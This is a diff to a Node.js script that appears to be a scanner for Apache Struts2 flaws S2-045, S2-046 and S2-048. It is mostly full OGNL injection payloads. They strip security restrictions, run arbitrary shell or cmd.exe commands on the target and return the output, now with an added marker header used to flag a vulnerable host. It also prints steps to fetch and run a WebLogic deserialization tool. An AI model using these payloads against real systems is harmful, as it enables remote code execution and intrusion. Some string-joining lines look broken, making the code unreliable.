@@ -70,7 +70,10 @@ var a = process.argv.splice(2),g_postData = "%{(#nike='multipart/form-data')"
 		+ ".(#cmds=(#iswin?{'cmd.exe','/c','" + g_szCmdW + "'}:{'/bin/bash','-c','" + g_szCmd + "'}))"
 		+ ".(#p=new java.lang.ProcessBuilder(#cmds))"
 		+ ".(#p.redirectErrorStream(true)).(#process=#p.start())"
-		+ ".(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream()))"
+		// response.addHeader
+		+ ".(#response=@org.apache.struts2.ServletActionContext@getResponse())"
+		+ ".(#response.addHeader('struts2','_struts2_'))"
+		+ ".(#ros=(#response.getOutputStream()))"
 
 	    // 我添加的当前位置行加上后，会无法输出
 	    // + ".(#ros.write(@org.apache.struts2.ServletActionContext@getRequest().getServletContext().getRealPath('.').getBytes()))"
@@ -299,7 +302,10 @@ function fnTest(s)
 function doStruts2_046(url)
 {
 	// 测试证明不能encodeURIComponent编码，filename 后的\0b不能少
-	var s = ("%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c','" + g_szCmdW + "'}:{'/bin/bash','-c','" + g_szCmd + "'})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}");
+	var s = ("%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c','" + g_szCmdW + "'}:{'/bin/bash','-c','" + g_szCmd + "'})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start())" +
+		+ ".(#response=@org.apache.struts2.ServletActionContext@getResponse())"
+		+ ".(#response.addHeader('struts2','_struts2_'))"
+		+ ".(#ros=(#response.getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}");
 	try{
 		var uO = urlObj.parse(url),host = uO.host.split(/:/)[0], port = uO.port || 80;
 		if(/.*?\/$/g.test(uO.path))uO.path = uO.path.substr(0, uO.path.length - 1);
@@ -388,7 +394,10 @@ function doStruts2_048(url,fnCbk)
 		".(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win')))" + 
 		".(#cmds=(#iswin?{'cmd.exe','/c','" + g_szCmdW + "'}:{'/bin/bash','-c','" + g_szCmd + "'}))" + 
 		".(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true))" + 
-		".(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream()))" + 
+		".(#process=#p.start())"
+		+ ".(#response=@org.apache.struts2.ServletActionContext@getResponse())"
+		+ ".(#response.addHeader('struts2','_struts2_'))"
+		+".(#ros=#response.getOutputStream())" + 
 		".(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}"
     var data = {
         "name": g_postData || payload,
@@ -439,7 +448,10 @@ function fnDoBody(body,t,rep)
 	// safegene
 	if(repT && repT.headers && repT.headers['safegene_msg'])
 		fnLog(decodeURIComponent(repT.headers['safegene_msg']));
-	// else console.log(repT.statusCode + " " + repT.url)
+
+
+	if(repT && repT.headers && repT.headers["struts2"])
+		g_oRst.struts2[t] = "发现struts2高危漏洞" + t + "，请尽快升级";
 
 	body||(body = "");
 	if(!body)
@@ -770,7 +782,11 @@ function fnCheckJavaFx(s)
 	var szF = "~/safe/mtx_jfxl/jfxl.jar";
 	child_process.exec("ls " + szF,function(e,so,se)
 	{
-		if(!so)console.log("mkdir ~/safe && cd ~/safe && git clone https://github.com/hktalent/weblogic_java_des.git");
+		if(!so)
+		{
+			console.log("mkdir ~/safe && cd ~/safe && git clone https://github.com/hktalent/weblogic_java_des.git\njava -jar ~/safe/mtx_jfxl/jfxl.jar " + s);
+
+		}
 		else
 		{
 			szF = "java -jar " + szF + " " + s;
